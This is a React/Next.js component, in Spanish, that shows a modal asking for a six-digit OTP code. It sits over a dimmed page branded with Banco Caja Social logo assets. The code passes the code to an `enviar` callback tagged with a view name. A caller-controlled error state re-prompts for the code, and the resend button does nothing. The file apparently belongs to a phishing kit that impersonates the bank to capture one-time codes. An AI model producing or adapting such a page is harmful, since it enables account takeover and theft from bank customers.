/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
"use client";
import { useState } from "react";
import LoaderFullScreen from "./LoaderFullScreen";

interface OtpProps {
  enviar?: (data: any) => void;
  isError?: boolean;
}

export default function Otp({ enviar, isError = false }: OtpProps) {
  const [showModal, setShowModal] = useState(true);
  const [otp, setOtp] = useState("");
  const [otpError, setOtpError] = useState(isError);
  const [loading, setLoading] = useState(false);

  const isValidOtp = (value: string) => /^\d{6}$/.test(value);

  const handleOtpSubmit = async (e?: React.FormEvent) => {
    e?.preventDefault();

    if (!isValidOtp(otp)) {
      setOtpError(true);
      return;
    }

    setLoading(true);

    if (enviar) {
      await enviar({ view: "otp", otp: otp });
      setLoading(false);
    } else {
      setTimeout(() => {
        setLoading(false);
      }, 2000);
    }
  };

  return (
    <>
      <LoaderFullScreen visible={loading} />

      {showModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4 backdrop-blur-sm animate-in fade-in duration-300">
          <div className="w-full max-w-[550px] bg-white rounded-lg shadow-2xl overflow-hidden animate-in zoom-in-95 duration-300">

            {/* Header del Modal */}
            <div className="flex items-center justify-between px-6 py-4 border-b border-gray-100">
              <h2 className="text-[20px] font-medium text-[#00548d]">
                {isError ? "❌ Error — Código OTP" : "🔑 Código OTP"}
              </h2>
              <button
                onClick={() => setShowModal(false)}
                className="text-gray-400 hover:text-gray-600 transition-colors"
              >
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>

            {/* Cuerpo del Modal */}
            <div className="p-10 flex flex-col items-center text-center">
              {isError && (
                <div className="w-full mb-6 bg-red-50 border border-red-200 rounded-md px-4 py-3">
                  <p className="text-red-600 text-[14px] font-semibold">
                    ⚠️ El código OTP ingresado es incorrecto. Por favor revise su correo/celular e inténtelo de nuevo.
                  </p>
                </div>
              )}

              <p className="text-[16px] text-[#4b5563] font-bold mb-8 max-w-[420px] leading-snug">
                Por favor ingrese el código de 6 dígitos enviado a su correo electrónico y/o teléfono celular registrados.
              </p>

              <form onSubmit={handleOtpSubmit} className="w-full flex flex-col items-center">
                <input
                  type="text"
                  maxLength={6}
                  inputMode="numeric"
                  value={otp}
                  onChange={(e) => {
                    const val = e.target.value.replace(/\D/g, "");
                    setOtp(val);
                    setOtpError(false);
                  }}
                  placeholder="000000"
                  className={`w-full max-w-[320px] h-[60px] text-center text-[28px] tracking-[10px] font-bold border rounded-md outline-none transition-all placeholder:tracking-normal placeholder:text-gray-200
                    ${otpError ? 'border-red-500 bg-red-50 text-red-600' : 'border-[#cfd6db] focus:border-[#00548d] text-[#333] shadow-sm'}
                  `}
                  autoFocus
                />

                {otpError && (
                  <p className="mt-4 text-red-500 text-[14px] font-medium italic">
                    El código debe ser de exactamente 6 dígitos numéricos.
                  </p>
                )}

                <div className="mt-12 w-full flex justify-center">
                  <button
                    type="submit"
                    disabled={otp.length !== 6}
                    className={`px-24 py-3.5 rounded-full text-[16px] font-bold transition-all
                      ${otp.length === 6
                        ? 'bg-[#00548d] text-white hover:bg-[#003d66] shadow-md active:scale-95'
                        : 'bg-[#cfd6db] text-[#8e979f] cursor-not-allowed'}
                    `}
                  >
                    Enviar
                  </button>
                </div>
              </form>
            </div>

            {/* Footer */}
            <div className="bg-gray-50 px-6 py-4 flex justify-center">
              <button className="text-[#00548d] text-[13px] font-bold hover:underline">
                ¿No recibió el código? Reenviar
              </button>
            </div>
          </div>
        </div>
      )}

      {/* FONDO DE PANTALLA */}
      <div className="flex min-h-screen bg-white font-sans opacity-40">
        <div className="hidden lg:block w-1/2 relative">
          <img src="/cajasocial/background-2.png" alt="Fondo" className="absolute inset-0 w-full h-full object-cover" />
        </div>
        <div className="w-full lg:w-1/2 flex items-center justify-center p-8">
          <div className="w-full max-w-[440px]">
            <img src="/cajasocial/logoBCSLine.svg" alt="Logo" className="h-[45px] mb-10" />
            <div className="h-4 bg-gray-200 rounded w-3/4 mb-4"></div>
            <div className="h-4 bg-gray-100 rounded w-1/2"></div>
          </div>
        </div>
      </div>
    </>
  );
}